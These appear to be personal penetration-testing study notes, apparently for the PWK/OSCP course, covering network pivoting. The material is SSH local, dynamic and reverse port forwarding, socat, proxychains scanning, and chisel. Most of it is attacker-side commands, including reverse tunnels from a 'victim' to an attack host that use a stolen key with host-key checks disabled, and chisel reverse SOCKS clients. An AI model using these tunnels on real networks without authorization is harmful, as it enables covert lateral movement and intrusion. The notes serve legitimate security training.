# Tunneling

##

## SSH Local Port Forwarding

{% code title="nc port scan" overflow="wrap" lineNumbers="true" %}
```
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```
{% endcode %}

The below command is run on Server A to create the SSH tunnel through Server B and reach Server C.&#x20;

{% code title="the command is run on Server A" overflow="wrap" lineNumbers="true" %}
```
ssh -N -L 0.0.0.0:4455:172.16.167.217:445 database_admin@10.4.167.215
```
{% endcode %}

kali -> (Server A) 192.168.167.63 -> (Server B) 10.4.167.215->(Server C) 172.16.167.217&#x20;

Now from Kali VM we can reach Server C and access the SMB Server.

```
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

So when you want to reach a port that is open only on the victim machine, but not from your attack host, you will use local port forwarding.

```
ssh -L 1234:localhost:5432 user@{target_IP}
```

### Socat

{% code title="on the victim -Running the Socat port forward command." overflow="wrap" lineNumbers="true" %}
```
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```
{% endcode %}

{% code title="On the kali box - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward." overflow="wrap" lineNumbers="true" %}
```
psql -h 192.168.50.63 -p 2345 -U postgres
```
{% endcode %}

## SSH Dynamic Port Forwarding

```
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

```
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 192.168.50.63 9999
```

```
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

## Reverse tunnel to attack host

UserKnownHostsFile=/dev/null and StrictHostKeyChecking=no. The first option prevents ssh from attempting to save the host key by sending the output to /dev/null. The second option will instruct ssh to not prompt us to accept the host key. Both of these options can be set via the -o flag.

```
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul
l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
```

\+ generate and use keys (page 779 PWK)

## Reverse dynamic port forwarding

newer versions of ssh support this feature

We will only need one port forwarding option, which is -R 1080. By not including a host after the port, ssh is instructed to create a SOCKS proxy on our Kali server. We also need to change the location of the private key

```
ssh -f -N -D 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /
var/lib/mysql/.ssh/id_rsa kali@10.11.0.4
```

### Proxychains

configure proxychains on Kali to use the SOCKS proxy. We can do this by opening etc/proxychains.conf and editing the last line, specifying port 1080.

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 127.0.0.1 1080
```

{% hint style="info" %}
Network scanning with ProxyChains will be slow so we will start with only the top 20 ports and expand our scope if needed.

You can speed up network scanning through proxychains by modifying the timeout via the tcp\_read\_time\_out and tcp\_connect\_time\_out values in /etc/proxychains.conf. However, don’t set these too low or you will receive incorrect results.
{% endhint %}

SOCKS proxies require a TCP connection to be made and thus a half-open or SYN scan cannot be used with ProxyChains.740 Since SOCKS proxies require a TCP connection, ICMP cannot get through either and we must disable pinging with the -Pn flag.

```
kali@kali:~$ proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20
```

### nmap proxychains scan

```
proxychains nmap 172.16.1.10 -sT -sV -Pn -T5 2>/dev/null

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-02 22:35 EET
Nmap scan report for static-172-16-1-10.rdsnet.ro (172.16.1.10)
Host is up (0.051s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PLINK.exe

from pwk pdf manual page 610. 20.3 chapter

this looks promising [https://www.pc-freak.net/blog/creating-ssh-tunnel-windows-plink/](https://www.pc-freak.net/blog/creating-ssh-tunnel-windows-plink/)

## NETSH

chapter 20.4 pwk pdf. this is used for port forwarding on Windows. You need to have SYSTEM rights on the windows box.&#x20;

## Chisel

{% embed url="https://medium.com/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683" %}

{% embed url="https://github.com/jpillora/chisel" %}

###

### Chisel local port forwarding

On the attack host

```
chisel server -p 8888 -reverse
```

On the victim(windows)

```
.\chisel.exe client 10.10.14.89:8888 R:1082:localhost:4444
```

On the attack host again to connect to forwarded port

```
nc -nv 127.0.0.1 1082
```

### On attacking box/kali from previous exam

```
chisel  server -p 8000 reverse
```

### On victim from previous exam

```
chisel.exe client 192.168.49.138:8000 R:socks
```

Or as mentioned in the above document:

### On the Attack Machine <a href="#id-94ad" id="id-94ad"></a>

```
chisel server -p 3477 --socks5 --reverse
```



### On the Victim Machine <a href="#id-9a15" id="id-9a15"></a>

```
chisel client 13.37.13.37:3477 R:5000:socks
```

### Proxychains

`/etc/proxychains.conf`

![](https://miro.medium.com/max/700/1\*mhBYMO2hZA0ZM5sCgwebLQ.png)

```
socks5
```
